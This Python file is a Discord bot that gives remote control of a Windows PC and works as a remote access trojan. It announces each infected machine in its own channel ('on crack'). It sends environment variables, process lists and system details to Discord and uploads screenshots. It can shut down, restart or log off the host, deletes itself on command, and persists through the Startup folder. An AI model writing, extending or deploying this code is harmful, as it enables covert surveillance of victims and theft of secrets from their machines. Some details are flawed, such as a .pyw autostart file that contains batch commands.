import discord
from discord.ext import commands
import os
import platform
import socket
import psutil
import subprocess
import requests
from PIL import ImageGrab
import uuid

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

BOT_TOKEN = 'PASTE_YOUR_BOT_TOKEN'

def create_embed(title, fields, color=discord.Color.blue()):
    embed = discord.Embed(title=title, color=color)
    for name, value in fields.items():
        if len(name) + len(value) > 6000:
            value = value[:6000 - len(name)]
        embed.add_field(name=name, value=value, inline=False)
    return embed

@bot.event
async def on_ready():
    print(f'Bot is ready. Logged in as {bot.user}')
    guild = bot.guilds[0]
    pc_name = platform.node()
    channel_name = f'{pc_name}-channel'

    existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
    if existing_channel is None:
        new_channel = await guild.create_text_channel(channel_name)
        print(f'New channel created: {new_channel.name}')
        embed = create_embed(f"{pc_name} on crack", {})
        await new_channel.send(embed=embed)
    else:
        print(f'Channel for {pc_name} already exists.')

@bot.command()
async def status(ctx):
    ip = requests.get('https://api.ipify.org').text
    ping = subprocess.run(['ping', '-c', '4', '8.8.8.8'], capture_output=True, text=True).stdout
    fields = {
        "IP Address": ip,
        "Ping": ping,
        "Bot Status": "Online"
    }
    embed = create_embed("Status", fields)
    await ctx.send(embed=embed)

@bot.command()
async def info(ctx):
    system_info = {
        "System": platform.system(),
        "Node": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU Usage": psutil.cpu_percent(interval=1),
        "Memory Usage": psutil.virtual_memory().percent,
        "Disk Usage": psutil.disk_usage('/').percent,
        "Boot Time": psutil.boot_time(),
        "Users": [user.name for user in psutil.users()],
        "Network Info": psutil.net_if_stats(),
        "Processes": [p.info for p in psutil.process_iter(['pid', 'name', 'username'])],
        "Environment Variables": os.environ
    }

    embed = discord.Embed(title="System Information", color=discord.Color.blue())
    for key, value in system_info.items():
        if isinstance(value, dict) or isinstance(value, list):
            value = str(value)  
        embed.add_field(name=key, value=value, inline=False)

    await ctx.send(embed=embed)

@bot.command()
async def shutdown(ctx):
    os.system("shutdown /s /t 1")
    embed = create_embed("System Shutdown", {"Description": "The system is shutting down."}, color=discord.Color.red())
    await ctx.send(embed=embed)

@bot.command()
async def restart(ctx):
    os.system("shutdown /r /t 1")
    embed = create_embed("System Restart", {"Description": "The system is restarting."}, color=discord.Color.orange())
    await ctx.send(embed=embed)

@bot.command()
async def logout(ctx):
    os.system("shutdown /l")
    embed = create_embed("User Logout", {"Description": "The user is logging out."}, color=discord.Color.purple())
    await ctx.send(embed=embed)

@bot.command()
async def screenshot(ctx):
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    with open("screenshot.png", "rb") as f:
        picture = discord.File(f)
        embed = create_embed("Screenshot", {}, color=discord.Color.blue())
        embed.set_image(url=f"attachment://screenshot.png")
        await ctx.send(file=picture, embed=embed)
    os.remove("screenshot.png")

@bot.command()
async def emergency(ctx):
    script_path = os.path.abspath(__file__)
    os.remove(script_path)
    embed = create_embed("Emergency Shutdown", {"Description": "The script is deleting itself."}, color=discord.Color.red())
    await ctx.send(embed=embed)

@bot.command(name='help')
async def custom_help(ctx):
    fields = {
        "!status": "Displays the IP address, ping, and bot status.",
        "!info": "Collects and sends system information in a text file.",
        "!shutdown": "Shuts down the system.",
        "!restart": "Restarts the system.",
        "!logout": "Logs out the current user.",
        "!screenshot": "Takes a screenshot and sends it as an attachment.",
        "!emergency": "Deletes the script and stops the bot.",
        "!help": "Displays this help message."
    }
    embed = create_embed("Help", fields, color=discord.Color.blurple())
    await ctx.send(embed=embed)

def enable_autostart():
    script_path = os.path.abspath(__file__)
    target_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'bot_script.pyw')
    if not os.path.exists(target_path):
        with open(target_path, 'w') as f:
            f.write(f'@echo off\npython "{script_path}"')
        print(f'Autostart enabled: {target_path}')

enable_autostart()

bot.run(BOT_TOKEN)